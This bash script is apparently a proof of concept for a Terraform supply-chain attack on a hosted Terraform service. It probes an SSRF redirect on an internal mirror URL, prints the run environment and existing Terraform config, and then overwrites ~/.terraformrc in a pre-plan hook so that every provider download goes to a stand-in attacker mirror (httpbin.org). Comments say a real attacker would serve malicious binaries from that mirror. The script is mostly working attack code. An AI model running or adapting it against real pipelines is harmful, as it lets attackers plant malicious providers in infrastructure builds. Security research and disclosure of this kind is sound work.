#!/usr/bin/env bash
# SUPPLY CHAIN DEMO
# Shows: hook runs before terraform init → hook can redirect provider downloads to attacker server

MIRROR="https://internal.main.scalr.dev/terraform-mirror"

echo "=== SSRF: confirm redirect vector still works ==="
curl -sk --no-location --path-as-is -D - \
  "$MIRROR/https%3A%2F%2Fhttpbin.org%2Fanything" 2>/dev/null \
  | grep -E "^HTTP/|^[Ll]ocation:" | head -2

echo ""
echo "=== RUN ENVIRONMENT: what terraform sees ==="
echo "TF_CLI_CONFIG_FILE: ${TF_CLI_CONFIG_FILE:-not set}"
echo "HOME: $HOME"
echo "USER: $(whoami)"
echo "existing ~/.terraformrc: $([ -f ~/.terraformrc ] && cat ~/.terraformrc || echo 'not present')"
echo "existing TF_PLUGIN_CACHE_DIR: ${TF_PLUGIN_CACHE_DIR:-not set}"
echo "TERRAFORM_CONFIG env: ${TERRAFORM_CONFIG:-not set}"

echo ""
echo "=== SUPPLY CHAIN: overwrite .terraformrc with attacker mirror BEFORE terraform init ==="
# Pre-plan hook runs before terraform init.
# Writing ~/.terraformrc here redirects ALL provider downloads to attacker server.
# httpbin.org stands in for attacker's provider mirror.
cat > ~/.terraformrc << 'TFRC'
provider_installation {
  network_mirror {
    url = "https://httpbin.org/anything/providers/"
    include = ["registry.terraform.io/*/*"]
  }
  direct {
    exclude = ["registry.terraform.io/*/*"]
  }
}
TFRC

echo "wrote ~/.terraformrc:"
cat ~/.terraformrc

echo ""
echo "Terraform init will now request providers from httpbin.org/anything/providers/"
echo "(In real attack: replace httpbin.org with attacker-controlled mirror serving malicious binaries)"
echo ""
echo "Pre-plan hook done — terraform init starts next, watch for provider download in plan log"
